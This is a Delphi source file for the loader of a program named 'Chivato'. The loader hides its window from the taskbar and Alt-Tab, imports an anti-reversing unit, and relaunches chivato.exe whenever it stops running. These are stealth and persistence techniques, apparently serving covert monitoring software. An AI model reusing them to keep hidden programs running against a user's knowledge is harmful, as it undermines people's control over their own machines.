
///////////////////////////////////////////////////////////////////////////////
// Nombre: ULoader
// Autor: Santiago A. Orellana Pérez (Chago)
// Creado: 23/07/2016
// Objetivo: Implementa el formulario principal del cargador de Chivato.
///////////////////////////////////////////////////////////////////////////////

unit ULoader;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UAntiReversing, ExtCtrls, ShellApi, UCommon;

//-----------------------------------------------------------------------------
// Constantes de los nombre de objetos mutex y del fichero ejecutable.
//-----------------------------------------------------------------------------
const cSemaphoreChivato = 'SemaphoreChivato';
const cSemaphoreLoader  = 'SemaphoreLoaders';

const cChivatoFileName1  = 'chivato.exe';

//-----------------------------------------------------------------------------
type
  TForm1 = class(TForm)
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    procedure HideInShel;
    function Exist(SemaphoreName: String): Boolean;
    function NormaliceDirectory(Dir: String): String;
    procedure ExecuteChivato(Delay: Integer);
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

//-----------------------------------------------------------------------------
// Oculta el formulario principal, quitándolo de la barra de tareas y del
// comando Alt-tab. Solo se hace visible en el administrador de tareas.
//-----------------------------------------------------------------------------
procedure TForm1.HideInShel;
begin
BorderStyle := bsSizeable;               //Mantener este valor para que responda a las hotkey globales.
Left := 0;                               //Pegamos el formulario a la esquina
Top := 0;                                //superior izquierda de la pantalla.
Width := 0;                              //Le asignamos un tamaño bastante pequeño.
Height := 0;                             //
Visible := False;                        //Hacemos que el formulario no sea visible.
Application.Title := '';                 //No le ponemos título a la ventana.
Application.ShowMainForm := False;       //No mostramos el formulario.

//Lo ocultamos de la barra de tareas y del comando Alt + Tab.
ShowWindow(Application.Handle, SW_HIDE);
SetWindowLong(Application.Handle, GWL_EXSTYLE,
              GetWindowLong(Application.Handle, GWL_EXSTYLE) or
              WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
end;

//-----------------------------------------------------------------------------
// Devuelve TRUE si el semáforo especificado existe.
//-----------------------------------------------------------------------------
function TForm1.Exist(SemaphoreName: String): Boolean;
var Semaphore: THandle;
begin
try
   Semaphore := CreateSemaphore(nil, 0, 1, PChar(CreateNameFor(cFileInit, SemaphoreName)));
except
   Semaphore := 0;
end;
result := (Semaphore <> 0) and (GetLastError = ERROR_ALREADY_EXISTS);
if Semaphore <> 0 then CloseHandle(Semaphore);
end;

//-----------------------------------------------------------------------------
// Normalizar el nombre de un directorio.
//-----------------------------------------------------------------------------
function TForm1.NormaliceDirectory(Dir: String): String;
begin
if Dir <> '' then if Dir[Length(Dir)] <> '\' then Dir := Dir + '\';
Result := Dir;
end;

//-----------------------------------------------------------------------------
// Asegura que la aplicación CHIVATO esté siempre ejecutándose.
//-----------------------------------------------------------------------------
procedure TForm1.Timer1Timer(Sender: TObject);
begin
ExecuteChivato(30000);
end;

procedure TForm1.ExecuteChivato(Delay: Integer);
var BaseDirectory, ChivatoFile1: String;
begin
BaseDirectory := NormaliceDirectory(ExtractFilePath(Application.ExeName));
ChivatoFile1 := BaseDirectory + cChivatoFileName1;
try
   if not Exist(cSemaphoreChivato) then
      if FileExists(ChivatoFile1) then
         begin
         Sleep(Delay);                                                      //Hace una pausa de 30 segundos.
         ShellExecute(Handle, nil,PChar(ChivatoFile1),'','',SW_SHOWNORMAL); //Ejecuta la aplicación.
         end
      else
         Application.Terminate;
except
   Application.Terminate;
end;
end;

//-----------------------------------------------------------------------------
// Oculta la aplicación.
//-----------------------------------------------------------------------------
procedure TForm1.FormCreate(Sender: TObject);
begin
HideInShel;                           //Oculta la aplicación.
ExecuteChivato(0);                    //Ejecuta al Chivato inmediatamente.
Timer1.Interval := 1000;              //Establece el tiempo de muestreo (cada 1 segundo).
Timer1.OnTimer := Timer1Timer;        //Establece el manejador de eventos de muestreo.
Timer1.Enabled := True;               //Activa el muestreo.
end;

end.
